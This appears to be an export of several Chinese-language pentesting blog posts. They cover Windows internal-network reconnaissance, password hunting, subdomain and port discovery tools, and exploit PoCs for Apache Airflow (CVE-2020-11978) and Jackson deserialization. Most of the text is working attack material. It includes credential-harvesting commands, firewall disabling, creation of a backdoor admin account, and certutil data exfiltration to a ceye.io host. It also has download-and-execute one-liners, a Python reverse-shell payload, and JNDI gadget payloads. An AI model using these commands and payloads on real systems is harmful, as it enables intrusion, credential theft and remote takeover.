<h2 id="常用CMD命令"><a href="#常用CMD命令" class="headerlink" title="常用CMD命令"></a>常用CMD命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami # 查看当前用户</span><br><span class="line">net user # 查看所有用户</span><br><span class="line">query user # 查看当前在线用户</span><br><span class="line">ipconfig &#x2F;all # 查看当前主机的主机名&#x2F;IP&#x2F;DNS等信息</span><br><span class="line">route print # 查看路由表信息</span><br><span class="line">netstat -ano # 查看端口开放情况</span><br><span class="line">arp -a # 查看arp解析情况</span><br><span class="line">tasklist &#x2F;svc # 查看进程及对应服务名</span><br><span class="line">net localgroup administrators # 查看管理员组成员</span><br><span class="line">systeminfo # 查看系统信息含补丁信息</span><br><span class="line">net use # 查看ipc连接情况</span><br><span class="line">net view # 查看匿名共享情况</span><br><span class="line">netsh firewall show state # 查看防火墙状态</span><br><span class="line">cmdkey &#x2F;l # 查看当前保存的登陆凭证</span><br></pre></td></tr></table></figure>
<h2 id="Windows的本地命令执行"><a href="#Windows的本地命令执行" class="headerlink" title="Windows的本地命令执行"></a>Windows的本地命令执行</h2><p>可用来替代cmd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">forfiles &#x2F;c c:\windows\system32\calc.exe	#无限运行</span><br><span class="line">pcalua.exe -a c:\windows\system32\calc.exe	</span><br><span class="line">powershell SyncAppvPublishingServer.vbs &quot;n; Start-Process c:\windows\system32\calc.exe&quot;</span><br><span class="line">cmd.exe &#x2F;c &quot;ping 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;</span><br><span class="line">conhost C:\Windows\System32\calc.exe</span><br><span class="line">explorer.exe C:\Users\keefe\desktop\1.exe</span><br></pre></td></tr></table></figure>
<h2 id="域常用信息搜集"><a href="#域常用信息搜集" class="headerlink" title="域常用信息搜集"></a>域常用信息搜集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- net config workstation #查看当前登录域</span><br><span class="line">- net user &#x2F;domain # 获得所有域用户列表</span><br><span class="line">- net view &#x2F;domain # 查看所有的域</span><br><span class="line">- net view &#x2F;domain:XXX # 查看该域内所有主机</span><br><span class="line">- net group &#x2F;domain # 查看所有域用户组列表</span><br><span class="line">- net group &quot;domain computers&quot; &#x2F;domain # 查看域内所有的主机名</span><br><span class="line">- net group &quot;domain admins&quot; &#x2F;domain # 查看所有域管理员</span><br><span class="line">- net group &quot;domain controllers&quot; &#x2F;domain # 查看所有域控制器</span><br><span class="line">- net group &quot;enterprise admins&quot; &#x2F;domain # 查看所有企业管理员</span><br><span class="line">- nltest &#x2F;domain_trusts # 获取域信任信息</span><br><span class="line">- net time &#x2F;domain # 查看当前登录域</span><br><span class="line">- net accounts &#x2F;domain # 查看域密码策略</span><br><span class="line">- dsquery server # 寻找目录中的域控制器</span><br><span class="line">- netdom query pdc # 查看域控制器主机名</span><br><span class="line">- wmic useraccount get &#x2F;all #获取域内用户的详细信息</span><br></pre></td></tr></table></figure>
<h2 id="环境信息搜集"><a href="#环境信息搜集" class="headerlink" title="环境信息搜集"></a>环境信息搜集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- nbtscan.exe xx.xx.xx.xx&#x2F;24 # 查看c段机器</span><br><span class="line">- csvde.exe -f 1.csv -k # 批量导入&#x2F;导出AD用户</span><br><span class="line">- setspn.exe -T xx.xx.xx.xx -Q *&#x2F;* # 查看当前域内所有spn</span><br><span class="line">- netstat -ano  </span><br></pre></td></tr></table></figure>
<h2 id="密码搜集"><a href="#密码搜集" class="headerlink" title="密码搜集"></a>密码搜集</h2><p>密码文件</p>
<p>写了一个自动搜索像密码文件的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">set &#x2F;p pwd&#x3D;&quot;输入盘符,示例 C:&#x2F; &gt;&quot;</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.properties) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.ini) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.xml) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.config) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.conf) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.properties) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.ini) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.xml) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.config) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.conf) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
<p>还可以用下面的方式（抄的）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 查看 Windows 文件</span><br><span class="line">1）WDS</span><br><span class="line">Windows Deployment Services (Windows 部署服务，简称：WDS)，是提供给计算机管理员再企业或组织环境中为计算机部署操作系统的一种工具。</span><br><span class="line">通过 WDS 我们可以轻松地为客户端批量部署操作系统，并可管理影响和无人参与安装脚本，或提供需人参与和无人参与的安装选项。如：通过网络为一台计算机执行需要人参与或无人参与的系统安装过程；映像捕获计算机系统并将其部署到其他计算机上，而不受 HAL 的影响。</span><br><span class="line">但它存在一个问题，就是本地管理员密码以明文形式或 base64 编码存储在诸如以下位置：</span><br><span class="line">C:\unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\System32\sysprep.inf</span><br><span class="line">C:\Windows\System32\sysprep\sysprep.xml</span><br><span class="line">有一个 MSF 的模块可以通过其搜寻凭证（msf没找到不知道为啥）</span><br><span class="line"></span><br><span class="line">2）IIS服务器</span><br><span class="line">如果系统是采用 IIS 服务器部署的，可以看看 web.config ，因为它也可能以明文形式包含管理员密码。它本地文件地址通常如下：</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span><br><span class="line">C:\inetpub\wwwroot\web.config</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2. 命令搜索关键字</span><br><span class="line"></span><br><span class="line">4）注册表里查找关键字</span><br><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><span class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 &#x2F;v password</span><br><span class="line">5）查找可写目录</span><br><span class="line">dir &#x2F;a-r-d &#x2F;s &#x2F;b</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3. PowerSploit</span><br><span class="line">PowerSploit 有些模块可以检查各种文件和注册表中的凭据。</span><br><span class="line">Get-UnattendedInstallFile</span><br><span class="line">Get-Webconfig</span><br><span class="line">Get-ApplicationHost</span><br><span class="line">Get-SiteListPassword</span><br><span class="line">Get-CachedGPPPassword</span><br><span class="line">Get-RegistryAutoLogon</span><br></pre></td></tr></table></figure>
<p>其他密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;s &#x2F;a \域控IP\SYSVOL*.xml # 获取域里面所有机子的本地管理员账号密码</span><br><span class="line"></span><br><span class="line">netsh wlan show profiles # 查看连接过的wifi名称</span><br><span class="line"></span><br><span class="line">netsh wlan show profile name&#x3D;&quot;wifi名称&quot; key&#x3D;clear # 查看wifi的密码</span><br><span class="line"></span><br><span class="line">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials* # 查看RDP连接凭证</span><br><span class="line"></span><br><span class="line">laZagne.exe all -oN # 本地wifi&#x2F;浏览器等密码</span><br><span class="line"></span><br><span class="line">dir %APPDATA%\Microsoft\Windows\Recent # 查看最近打开的文档</span><br></pre></td></tr></table></figure>
<h2 id="关防火墙"><a href="#关防火墙" class="headerlink" title="关防火墙"></a>关防火墙</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure>
<h2 id="命令外带"><a href="#命令外带" class="headerlink" title="命令外带"></a>命令外带</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c &quot;ipconfig &gt; abcde &amp;&amp; set &#x2F;p xx&#x3D;&lt;abcde &amp;&amp; certutil -urlcache -split -f http:&#x2F;&#x2F;hrgjkb.ceye.io?a&#x3D;%xx%</span><br><span class="line"></span><br><span class="line">cmd &#x2F;c &#x2F;v &quot;ipconfig &gt; abcde &amp;&amp; set &#x2F;p xx&#x3D;&lt;abcde &amp;&amp; certutil -urlcache -split -f http:&#x2F;&#x2F;hrgjkb.ceye.io?a&#x3D;!xx!</span><br></pre></td></tr></table></figure>
<h2 id="RDP相关"><a href="#RDP相关" class="headerlink" title="RDP相关"></a>RDP相关</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">开启</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line">查端口</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber</span><br></pre></td></tr></table></figure>
<h2 id="新建用户相关"><a href="#新建用户相关" class="headerlink" title="新建用户相关"></a>新建用户相关</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user wocaini Wocaini121.. &#x2F;add</span><br><span class="line"></span><br><span class="line">加入管理员组</span><br><span class="line">net localgroup administrators wocaini &#x2F;add</span><br><span class="line"></span><br><span class="line"> 加入远程桌面用户组</span><br><span class="line">net localgroup &quot;remote desktop users&quot; wocaini &#x2F;add</span><br></pre></td></tr></table></figure>
<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Pcalua -a \\x.x.x.x\777.exe</span><br><span class="line">cmd &#x2F;c certutil -urlcache -split -f http:&#x2F;&#x2F;x.x.x.x&#x2F;%USERNAME%+%COMPUTERNAME%+%HOMEPATH%</span><br><span class="line">bitsadmin &#x2F;transfer myDownLoadJob &#x2F;download &#x2F;priority normal http:&#x2F;&#x2F;x.x.x.x c:\temp\777.exe</span><br><span class="line">powershell Start-BitsTransfer -Source &quot;http:&#x2F;&#x2F;10.0.2.21&#x2F;pentestlab.exe&quot; -Destination &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line">mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script: http:&#x2F;&#x2F;x.x.x.x&#x2F;hacktest&quot;&quot;)&quot;))</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;x.x.x.x&#x2F;key.txt payload</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;webserver&#x2F;payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;u payload.dll</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;webserver&#x2F;payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</span><br><span class="line">powershell &quot;Import-Module BitsTransfer;start-bitstransfer http:&#x2F;&#x2F;uee.me&#x2F;crAJs cd.bat&quot;|cd.bat</span><br></pre></td></tr></table></figure>
<h2 id="网络探测"><a href="#网络探测" class="headerlink" title="网络探测"></a>网络探测</h2><p>改进了一下网上的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem a段探测</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 修改ip的值以指定a段</span><br><span class="line"></span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;10</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%i in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%k in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for %%j in (1,254) do ( @ping %ip%.%%i.%%k.%%j -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot; &gt;&gt; null</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%i.%%k.%%j is alive ! &gt;&gt; ascan.txt ) else (echo %ip%.%%i.%%k.%%j May be not exist ! )</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem b段探测</span><br><span class="line">@echo off</span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;192.168</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%i in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for %%k in (1,254) do ( @ping %ip%.%%i.%%k -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot; &gt;&gt; null</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%i.%%k is alive ! &gt;&gt; bscan.txt ) else (echo %ip%.%%i.%%k May be not exist ! )</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem c段探测</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;192.168.148</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%k in (0,1,254) do  (</span><br><span class="line">@ping %ip%.%%k -w 1 -n 1| findstr &quot;TTL&#x3D;&quot; &gt;nul</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%k is alive ! &gt;&gt; cscan.txt ) else (echo %ip%.%%k May be not exist ! )</span><br><span class="line">)</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
<h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>内网windwos信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>Web的信息搜集</title>
    <url>/2021/01/14/Web%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<p><em>Web的信息搜集也很重要</em><a id="more"></a></p>
<p>记录一下自己常用的工具，不多。整一堆乱七八糟的信息搜集工具，真正上了的时候到底用哪个呢？</p>
<h1 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h1><h2 id="DomainNamePredictor"><a href="#DomainNamePredictor" class="headerlink" title="DomainNamePredictor"></a>DomainNamePredictor</h2><p>LandGrey写的的一款新工具，可以理解为强域名探测工具</p>
<p><a href="https://github.com/LandGrey/domainNamePredictor">https://github.com/LandGrey/domainNamePredictor</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python dnp.py -d A.com</span><br><span class="line">python dnp.py -f A.com-domains.txt -m simple</span><br><span class="line">python dnp.py -d demo.A.com -m simple -o &#x2F;tmp&#x2F;predictor-a.com.txt</span><br></pre></td></tr></table></figure>
<h2 id="kSubDomain"><a href="#kSubDomain" class="headerlink" title="kSubDomain"></a>kSubDomain</h2><p>知道创宇404团队写的的子域名爆破工具，可用来爆破三级、四级域名</p>
<p><a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用内置字典爆破</span><br><span class="line">ksubdomain -d seebug.org</span><br><span class="line"></span><br><span class="line">使用字典爆破域名</span><br><span class="line">ksubdomain -d seebug.org -f subdomains.dict</span><br><span class="line"></span><br><span class="line">字典里都是域名，可使用验证模式</span><br><span class="line">ksubdomain -f dns.txt -verify</span><br><span class="line"></span><br><span class="line">爆破三级域名</span><br><span class="line">ksubdomain -d seebug.org -l 2</span><br><span class="line"></span><br><span class="line">通过管道爆破</span><br><span class="line">echo &quot;seebug.org&quot;|ksubdomain</span><br><span class="line"></span><br><span class="line">通过管道验证域名</span><br><span class="line">echo &quot;paper.seebug.org&quot;|ksubdomain -verify</span><br><span class="line"></span><br><span class="line">仅使用网络API接口获取域名</span><br><span class="line">ksubdomain -d seebug.org -api</span><br><span class="line"></span><br><span class="line">完整模式,先使用网络API，在此基础使用内置字典进行爆破</span><br><span class="line">ksubdomain -d seebug.org -full</span><br></pre></td></tr></table></figure>
<h2 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h2><p>多功能集一体的子域名查询/爆破工具，一定要改配置文件添加上自己的各种接口，改了才好用</p>
<p><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
<p>一句话运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python OneForAll.py --target xx.com run</span><br></pre></td></tr></table></figure>
<h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><h2 id="AssetsHunter"><a href="#AssetsHunter" class="headerlink" title="AssetsHunter"></a>AssetsHunter</h2><p>一款快速优秀的探测/爆破工具</p>
<p><a href="https://github.com/rabbitmask/AssetsHunter">https://github.com/rabbitmask/AssetsHunter</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis爆破：</span><br><span class="line">python AssetsHunter.py -redisc 127.0.0.1 -p 6379 -l 1</span><br><span class="line">mysql爆破：</span><br><span class="line">python AssetsHunter.py -mysqlc 127.0.0.1 -u root -p 3306 -l 1</span><br><span class="line">ftp爆破：</span><br><span class="line">python AssetsHunter.py -ftpc 127.0.0.1 -p 21 -u rabbit -l 1</span><br><span class="line">ssh爆破：</span><br><span class="line">python AssetsHunter.py -sshc 127.0.0.1 -p 22 -u root -l 1</span><br><span class="line">信息泄露探测：</span><br><span class="line">python AssetsHunter.py -inforisk http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">whatcms</span><br><span class="line">python AssetsHunter.py -whatcms http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">C段探测</span><br><span class="line">python AssetsHunter.py -hawkeye 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>这还说什么呢？打！</p>
<p>masscan并不好用</p>
<h2 id="Wfuzz"><a href="#Wfuzz" class="headerlink" title="Wfuzz"></a>Wfuzz</h2><p>Wfuzz其实可以用来跑端口，很简单暴力。对于某些有奇葩防护，开了虚假全端口的站，有奇效。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z range,1-65536 --hc 404,403 --hw 0 --req-delay 1 --conn-delay 1 -Z URL</span><br><span class="line">wfuzz -c -z range,8000-9000 --hl 0 --req-delay 1 --conn-delay 1 -Z URL</span><br></pre></td></tr></table></figure>
<p>不管是hc还是sc，hl还是sl，找合适的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--hc&#x2F;hl&#x2F;hw&#x2F;hh N[,N]+ : 以指定的返回码&#x2F;行数&#x2F;字数&#x2F;字符数作为判断条件隐藏返回结果</span><br><span class="line">--sc&#x2F;sl&#x2F;sw&#x2F;sh N[,N]+ : 以指定的返回码&#x2F;行数&#x2F;字数&#x2F;字符数作为判断条件显示返回结果</span><br></pre></td></tr></table></figure>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>其他的就是各种技巧了，比如whois查备案联系人，联系人再反查域名，拿到二级域名后再去查三级域名，三级域名解析后再去C段等等无限人工递归查询。还有单位名称工商注册查询、域名备案号查询之类的，实在不行去企查查、天眼查去查查二级单位什么的。</p>
<h1 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h1>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Airflow</title>
    <url>/2021/01/14/Apache-Airflow/</url>
    <content><![CDATA[<p><em>Apache-Airflow是Airbnb开源的一款数据流程工具，目前是Apache孵化项目。</em><a id="more"></a></p>
<h1 id="CVE-2020-11978-命令执行"><a href="#CVE-2020-11978-命令执行" class="headerlink" title="CVE-2020-11978-命令执行"></a>CVE-2020-11978-命令执行</h1><p>Apache Airflow 1.10.10及之前版本中的 example DAGs存在操作系统命令注入漏洞。</p>
<p>example_trigger_target_dag</p>
<p><img src="/images/3.png" alt="3"></p>
<p><img src="/images/1.png" alt="1"></p>
<p>检测Poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;&#39;\&quot;;ping s5pjot.dnslog.cn\&quot;;#&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>反弹Poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;&#39;\&quot;;python -c \&quot;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;x.x.x.x&#39;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;sh&#39;,&#39;-i&#39;])\&quot;;#&quot;&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Poc</category>
      </categories>
      <tags>
        <tag>Apache Airflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Jackson</title>
    <url>/2021/01/15/Jackson/</url>
    <content><![CDATA[<p><em>Jackson 是一个 Java 的用来处理 JSON 格式数据的类库，多为JNDI注入</em>。<a id="more"></a></p>
<h1 id="CVE-2017-17485"><a href="#CVE-2017-17485" class="headerlink" title="CVE-2017-17485"></a>CVE-2017-17485</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;,&quot;http</span><br><span class="line">:&#x2F;&#x2F;远端vps地址&#x2F;spel.xml&quot;]&#125;</span><br><span class="line"></span><br><span class="line">spel.xml</span><br><span class="line">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;</span><br><span class="line">xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation&#x3D;&quot;</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd</span><br><span class="line">&quot;&gt;</span><br><span class="line">&lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;constructor-arg value&#x3D;&quot;calc&quot; &#x2F;&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;whatever&quot; value&#x3D;&quot;#&#123; pb.start() &#125;&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;bean&gt;</span><br><span class="line">&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2017-15095"><a href="#CVE-2017-15095" class="headerlink" title="CVE-2017-15095"></a>CVE-2017-15095</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;,&quot;autoCommit&quot;:true&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;, &quot;autoCommit&quot;:true&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;, &quot;autoCommit&quot;:true&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;, &quot;autoCommit&quot;:true&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="1-2-45"><a href="#1-2-45" class="headerlink" title="1-2-45"></a>1-2-45</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&#123;&quot;properties&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1-2-68"></a>1-2-68</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&#123;&quot;resourceName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&#123;&quot;metricRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&#123;&quot;healthCheckRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&#123;&quot;jndiNames&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-12022"><a href="#CVE-2018-12022" class="headerlink" title="CVE-2018-12022"></a>CVE-2018-12022</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;jodd.db.connection.DataSourceConnectionProvider&quot;,&quot;ssiipp&quot;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-12023"><a href="#CVE-2018-12023" class="headerlink" title="CVE-2018-12023"></a>CVE-2018-12023</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&#123;&quot;xadataSourceName&quot;:&quot;ssiipp&quot;,&quot;logWriter&quot;:null&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-19360"><a href="#CVE-2018-19360" class="headerlink" title="CVE-2018-19360"></a>CVE-2018-19360</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.axis2.transport.jms.JMSOutTransportInfo&quot;, &quot;jms:&#x2F;ssiipp&quot;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-19361"><a href="#CVE-2018-19361" class="headerlink" title="CVE-2018-19361"></a>CVE-2018-19361</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.openjpa.ee.JNDIManagedRuntime&quot;,&#123;&quot;transactionManagerName&quot;:&quot;ssiipp&quot;, &quot;rollbackOnly&quot;:null&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-5968"><a href="#CVE-2018-5968" class="headerlink" title="CVE-2018-5968"></a>CVE-2018-5968</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.hibernate.jmx.StatisticsService&quot;,&#123;&quot;sessionFactoryJNDIName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
